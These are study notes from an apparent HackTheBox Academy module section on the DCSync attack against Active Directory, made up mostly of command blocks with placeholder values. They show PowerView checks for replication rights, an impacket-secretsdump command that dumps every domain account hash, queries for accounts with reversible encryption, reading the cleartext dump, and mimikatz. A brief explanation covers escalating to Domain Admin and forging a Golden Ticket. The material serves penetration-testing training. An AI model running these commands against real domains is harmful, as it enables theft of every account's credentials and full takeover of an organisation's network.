# Section 22: DCSync

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1489
- Code/command blocks: 8

> Terminal output is omitted; only commands & scripts are captured.

```powershell
Get-DomainUser -Identity {{USERNAME}}  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```

```powershell
$sid= "{{SID}}"
Get-ObjectAcl "DC={{DOMAIN_NB}},DC=LOCAL" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

> **What this checks:** DCSync needs **both** replication extended rights on the domain object. If the ACL above lists your `$sid` with both, that principal can DCSync — i.e. dump *any/all* account hashes (Administrator → PtH as DA; krbtgt → Golden Ticket).
>
> | Right | GUID |
> |---|---|
> | DS-Replication-Get-Changes | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` |
> | DS-Replication-Get-Changes-All | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` |
>
> `-match 'Replication-Get'` catches both; **one alone isn't enough**. Default holders (Domain Admins, Enterprise Admins, Domain Controllers) are noise — the finding is a **non-default** principal (e.g. a user you compromised via [21](21-acl-abuse-tactics.md)) holding these. BloodHound flags the same thing as a `DCSync` edge to the domain.

```bash
impacket-secretsdump -outputfile hashes -just-dc {{DOMAIN_NB}}/{{USERNAME}}@{{DC_IP}} 
```

```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

```bash
cat hashes.ntds.cleartext 
```

```cmd
runas /netonly /user:{{DOMAIN_NB}}\{{USERNAME}} powershell
```

```powershell
.\mimikatz.exe
```

